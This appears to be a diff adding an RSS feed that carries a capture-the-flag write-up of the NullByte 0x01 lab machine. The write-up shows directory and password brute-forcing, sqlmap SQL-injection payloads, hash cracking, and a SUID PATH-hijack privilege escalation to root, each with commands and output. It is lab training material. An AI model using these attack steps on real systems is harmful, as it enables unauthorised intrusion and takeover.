@@ -1,0 +1,401 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Nullbyte on Cheesy Rumbles</title>
+    <link>http://rastamouse.me/categories/nullbyte/</link>
+    <description>Recent content in Nullbyte on Cheesy Rumbles</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 21 Aug 2015 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/categories/nullbyte/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>NullByte 0x01</title>
+      <link>http://rastamouse.me/writeups/2015/nullbyte-0x01/</link>
+      <pubDate>Fri, 21 Aug 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/nullbyte-0x01/</guid>
+      <description>
+
+&lt;p&gt;NullByte is a hacking challenge created by &lt;a href=&#34;https://twitter.com/@ly0nx&#34;&gt;ly0n&lt;/a&gt;, pitched at a beginner-intermediate level.  The objective is to grab the flag.&lt;/p&gt;
+
+&lt;h2 id=&#34;port-scan:485cf21adfc47fdddfc7e45f092151aa&#34;&gt;Port Scan&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -A 192.168.56.102
+
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Null Byte 00 - level 1
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          53905/udp  status
+|_  100024  1          54255/tcp  status
+777/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
+|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
+|_  256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Pop on over in a browser and we see an Eye of Harmony and a little message.  There&amp;rsquo;s nothing else to see, so I did some directory bruteforcing.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/nullbyte0x01/eye.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.56.102 -f
+
+=====================================================
+Gobuster v0.8 (DIR support by OJ Reeves @TheColonial)
+              (DNS support by Peleus     @0x42424242)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://192.168.56.102/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes : 200,204,301,302,307
+[+] Add Slash    : true
+=====================================================
+/uploads/ (200)
+/phpmyadmin/ (200)
+=====================================================
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I haven&amp;rsquo;t any credentials for phpMyAdmin, so lets take a closer look at the image (main.gif).&lt;/p&gt;
+
+&lt;p&gt;Using &lt;code&gt;exiftool&lt;/code&gt;, we can see that there is an embeded comment.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/Downloads# exiftool main.gif 
+ExifTool Version Number         : 9.74
+File Name                       : main.gif
+Directory                       : .
+File Size                       : 16 kB
+File Modification Date/Time     : 2015:08:21 21:53:41+01:00
+File Access Date/Time           : 2015:08:21 21:53:41+01:00
+File Inode Change Date/Time     : 2015:08:21 21:53:41+01:00
+File Permissions                : rw-r--r--
+File Type                       : GIF
+MIME Type                       : image/gif
+GIF Version                     : 89a
+Image Width                     : 235
+Image Height                    : 302
+Has Color Map                   : No
+Color Resolution Depth          : 8
+Bits Per Pixel                  : 1
+Background Color                : 0
+Comment                         : P-): kzMb5nVYJw
+Image Size                      : 235x302
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;kzMb5nVYJw&lt;/code&gt; seems to be an interesting string.  After trying various things (passwords etc), it turns out this is a new web directory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://192.168.56.102/kzMb5nVYJw/
+
+&amp;lt;center&amp;gt;
+&amp;lt;form method=&amp;quot;post&amp;quot; action=&amp;quot;index.php&amp;quot;&amp;gt;
+Key:&amp;lt;br&amp;gt;
+&amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;key&amp;quot;&amp;gt;
+&amp;lt;/form&amp;gt; 
+&amp;lt;/center&amp;gt;
+&amp;lt;!-- this form isn&#39;t connected to mysql, password ain&#39;t that complex --!&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The notion that the password isn&amp;rsquo;t complex implies that we may be able to bruteforce it.  I did this with Hydra - note that it requires both a password and a username be specified.  You can give it a dummy username without supplying it in the actual request.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# hydra 192.168.56.102 http-form-post &amp;quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&amp;quot; -l rasta -P /usr/share/wordlists/metasploit-jtr/password.lst
+[80][http-post-form] host: 192.168.56.102   login: rasta   password: elite
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After loggin in with the key &lt;code&gt;elite&lt;/code&gt;, we see a form where we can search for usernames.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/nullbyte0x01/usrsearch.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;Submitting a blank query returns two results.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://192.168.56.102/kzMb5nVYJw/420search.php?usrtosearch=
+
+EMP ID :1
+EMP NAME : ramses
+EMP POSITION :
+--------------------------------
+EMP ID :2
+EMP NAME : isis
+EMP POSITION : employee
+--------------------------------
+Fetched data successfully
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;sqli:485cf21adfc47fdddfc7e45f092151aa&#34;&gt;SQLi&lt;/h2&gt;
+
+&lt;p&gt;I threw &lt;code&gt;sqlmap&lt;/code&gt; at the page, to try injections in the &lt;code&gt;usrtosearch&lt;/code&gt; field. Luckily, it returned a few blind-based possible injections.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# sqlmap -u &amp;quot;http://192.168.56.102/kzMb5nVYJw/420search.php?usrtosearch=&amp;quot; --dbms=MySQL
+
+---
+Parameter: usrtosearch (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: usrtosearch=&amp;quot; AND 8735=8735#
+
+    Type: AND/OR time-based blind
+    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT - comment)
+    Payload: usrtosearch=&amp;quot; AND (SELECT * FROM (SELECT(SLEEP(5)))pEsD)#
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: usrtosearch=&amp;quot; UNION ALL SELECT NULL,CONCAT(0x7178787071,0x736e4f426852624a4242,0x7178786a71),NULL#
+---
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] seth
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I couldn&amp;rsquo;t find any credentials in the &lt;code&gt;phpmyadmin&lt;/code&gt; database, so went on to explore &lt;code&gt;seth&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Database: seth
+Table: users
+[2 entries]
++----+---------------------------------------------+--------+------------+
+| id | pass                                        | user   | position   |
++----+---------------------------------------------+--------+------------+
+| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &amp;lt;blank&amp;gt;    |
+| 2  | --not allowed--                             | isis   | employee   |
++----+---------------------------------------------+--------+------------+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This password is in the format of base64(md5), but has the terminating &lt;code&gt;=&lt;/code&gt; missing.  We can reverse the base64, recover the md5 and crack with &lt;code&gt;john&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# echo -en &#39;YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=&#39; | base64 -d
+c6d6bd7ebf806f43c76acc3681703b81
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# echo -en &#39;YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=&#39; | base64 -d &amp;gt; ramses
+
+root@kali:~# john --format=raw-md5 ramses 
+
+Loaded 1 password hash (Raw-MD5 [MD5 32/32])
+omega            (?)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;ssh:485cf21adfc47fdddfc7e45f092151aa&#34;&gt;SSH&lt;/h2&gt;
+
+&lt;p&gt;The credentials &lt;code&gt;ramses:omega&lt;/code&gt; can also be used to log in via SSH, remember on port 777.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh ramses@192.168.56.102 -p777
+ramses@192.168.56.102&#39;s password:
+
+ramses@NullByte:~$ pwd
+/home/ramses
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;procwatch-suid:485cf21adfc47fdddfc7e45f092151aa&#34;&gt;procwatch SUID&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;.bash_history&lt;/code&gt; has references to &lt;code&gt;/var/www/backup/procwatch&lt;/code&gt;, which turns out to be a SUID binary owned by &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rwsr-xr-x 1 root root 4932 Aug  2 01:29 procwatch
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Running the binary seems to produce output from &lt;code&gt;ps&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ramses@NullByte:/var/www/backup$ ./procwatch 
+  PID TTY          TIME CMD
+24253 pts/0    00:00:00 procwatch
+24254 pts/0    00:00:00 sh
+24255 pts/0    00:00:00 ps
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The binary doesn&amp;rsquo;t seem to take any input as arguments, so I used &lt;code&gt;scp&lt;/code&gt; to copy it to my Kali box for closer inspection.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# scp -P777 ramses@192.168.56.102:/var/www/backup/procwatch .
+ramses@192.168.56.102&#39;s password: 
+procwatch                                                                                                                   100% 4932     4.8KB/s   00:00
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# file procwatch 
+procwatch: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=17d666a0c940726b29feedde855535fb21cb160c, not stripped
+
+root@kali:~# gdb -q ./procwatch
+gdb-peda$ checksec 
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let&amp;rsquo;s disassemble the main function.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pdisass main
+
+   0x080483fb &amp;lt;+0&amp;gt;:	lea    ecx,[esp+0x4]
+   0x080483ff &amp;lt;+4&amp;gt;:	and    esp,0xfffffff0
+   0x08048402 &amp;lt;+7&amp;gt;:	push   DWORD PTR [ecx-0x4]
+   0x08048405 &amp;lt;+10&amp;gt;:	push   ebp
+   0x08048406 &amp;lt;+11&amp;gt;:	mov    ebp,esp
+   0x08048408 &amp;lt;+13&amp;gt;:	push   ecx
+   0x08048409 &amp;lt;+14&amp;gt;:	sub    esp,0x44
+   0x0804840c &amp;lt;+17&amp;gt;:	lea    eax,[ebp-0x3a]
+   0x0804840f &amp;lt;+20&amp;gt;:	mov    WORD PTR [eax],0x7370
+   0x08048414 &amp;lt;+25&amp;gt;:	mov    BYTE PTR [eax+0x2],0x0
+   0x08048418 &amp;lt;+29&amp;gt;:	sub    esp,0xc
+   0x0804841b &amp;lt;+32&amp;gt;:	lea    eax,[ebp-0x3a]
+   0x0804841e &amp;lt;+35&amp;gt;:	push   eax
+   0x0804841f &amp;lt;+36&amp;gt;:	call   0x80482d0 &amp;lt;system@plt&amp;gt;
+   0x08048424 &amp;lt;+41&amp;gt;:	add    esp,0x10
+   0x08048427 &amp;lt;+44&amp;gt;:	mov    eax,0x0
+   0x0804842c &amp;lt;+49&amp;gt;:	mov    ecx,DWORD PTR [ebp-0x4]
+   0x0804842f &amp;lt;+52&amp;gt;:	leave  
+   0x08048430 &amp;lt;+53&amp;gt;:	lea    esp,[ecx-0x4]
+   0x08048433 &amp;lt;+56&amp;gt;:	ret
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The call to &lt;code&gt;system()&lt;/code&gt; at &lt;code&gt;+36&lt;/code&gt; jumps out.  To see what was getting passed to system, I set a breakpoint at &lt;code&gt;0x0804841f&lt;/code&gt; and ran the binary.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ b *0x0804841f
+gdb-peda$ r
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xbff92fee --&amp;gt; 0x7370 (&#39;ps&#39;)
+EBX: 0xb76ee000 --&amp;gt; 0x1a5da8 
+ECX: 0xbff93040 --&amp;gt; 0x1 
+EDX: 0xbff93064 --&amp;gt; 0xb76ee000 --&amp;gt; 0x1a5da8 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xbff93028 --&amp;gt; 0x0 
+ESP: 0xbff92fd0 --&amp;gt; 0xbff92fee --&amp;gt; 0x7370 (&#39;ps&#39;)
+EIP: 0x804841f (&amp;lt;main+36&amp;gt;:	call   0x80482d0 &amp;lt;system@plt&amp;gt;)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048418 &amp;lt;main+29&amp;gt;:	sub    esp,0xc
+   0x804841b &amp;lt;main+32&amp;gt;:	lea    eax,[ebp-0x3a]
+   0x804841e &amp;lt;main+35&amp;gt;:	push   eax
+=&amp;gt; 0x804841f &amp;lt;main+36&amp;gt;:	call   0x80482d0 &amp;lt;system@plt&amp;gt;
+   0x8048424 &amp;lt;main+41&amp;gt;:	add    esp,0x10
+   0x8048427 &amp;lt;main+44&amp;gt;:	mov    eax,0x0
+   0x804842c &amp;lt;main+49&amp;gt;:	mov    ecx,DWORD PTR [ebp-0x4]
+   0x804842f &amp;lt;main+52&amp;gt;:	leave
+Guessed arguments:
+arg[0]: 0xbff92fee --&amp;gt; 0x7370 (&#39;ps&#39;)
+arg[1]: 0x0 
+arg[2]: 0xc2 
+arg[3]: 0xb75dc586 (&amp;lt;handle_intel+102&amp;gt;:	test   eax,eax)
+[------------------------------------stack-------------------------------------]
+0000| 0xbff92fd0 --&amp;gt; 0xbff92fee --&amp;gt; 0x7370 (&#39;ps&#39;)
+0004| 0xbff92fd4 --&amp;gt; 0x0 
+0008| 0xbff92fd8 --&amp;gt; 0xc2 
+0012| 0xbff92fdc --&amp;gt; 0xb75dc586 (&amp;lt;handle_intel+102&amp;gt;:	test   eax,eax)
+0016| 0xbff92fe0 --&amp;gt; 0xffffffff 
+0020| 0xbff92fe4 --&amp;gt; 0xbff9300e --&amp;gt; 0x10804 
+0024| 0xbff92fe8 --&amp;gt; 0xb7554bf8 --&amp;gt; 0x2aa0 
+0028| 0xbff92fec --&amp;gt; 0x737091e3 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0804841f in main ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now we can see that the argument being passed to system is &lt;code&gt;ps&lt;/code&gt;, critically without an absolute path.  This means all that&amp;rsquo;s required to highjack this binary, is a bit of PATH manipulation.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ramses@NullByte:/var/www/backup$ cp /bin/sh ps
+ramses@NullByte:/var/www/backup$ export PATH=/var/www/backup:$PATH
+
+ramses@NullByte:/var/www/backup$ ./procwatch 
+# id
+uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
+# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;flag:485cf21adfc47fdddfc7e45f092151aa&#34;&gt;Flag&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# cat /root/proof.txt
+adf11c7a9e6523e630aaf3b9b7acb51d
+
+It seems that you have pwned the box, congrats. 
+Now you done that I wanna talk with you. Write a walk &amp;amp; mail at
+xly0n@sigaint.org attach the walk and proof.txt
+If sigaint.org is down you may mail at nbsly0n@gmail.com
+
+
+USE THIS PGP PUBLIC KEY
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+[...snip...]
+-----END PGP PUBLIC KEY BLOCK-----
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
